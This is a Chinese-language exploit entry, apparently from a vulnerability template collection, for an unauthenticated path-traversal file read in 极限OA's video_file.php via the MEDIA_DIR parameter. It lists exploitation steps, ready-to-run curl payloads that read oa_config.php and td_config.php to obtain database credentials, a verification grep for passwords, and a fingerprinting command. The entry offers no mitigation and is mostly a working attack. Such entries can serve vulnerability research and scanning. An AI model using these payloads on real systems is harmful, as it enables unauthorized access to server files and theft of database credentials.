---
id: JIXIAN-FILE-READ
title: 极限OA video_file.php 任意文件读取漏洞
product: jixian-oa
vendor: 极限OA
version_affected: "all versions"
severity: HIGH
tags: [file_read, path_traversal, 无需认证, 国产, oa]
fingerprint: ["极限OA"]
---

## 漏洞描述

极限OA 的 video_file.php 文件存在路径穿越导致的任意文件读取漏洞，攻击者无需认证即可通过 MEDIA_DIR 参数的目录穿越读取服务器上的任意文件，获取 OA 配置中的数据库凭据等敏感信息。

## 影响版本

- 极限OA（所有已知版本）

## 前置条件

- 无需认证
- 目标运行极限OA

## 利用步骤

1. 确认目标为极限OA
2. 通过 MEDIA_DIR 参数路径穿越
3. 读取 oa_config.php 获取数据库凭据

## Payload

```bash
# 读取 OA 配置文件
curl -s "http://target/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php"

# 读取其他配置
curl -s "http://target/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=td_config.php"
```

## 验证方法

```bash
curl -s "http://target/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php" | grep -i "db_\|mysql\|password"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "极限OA"
```
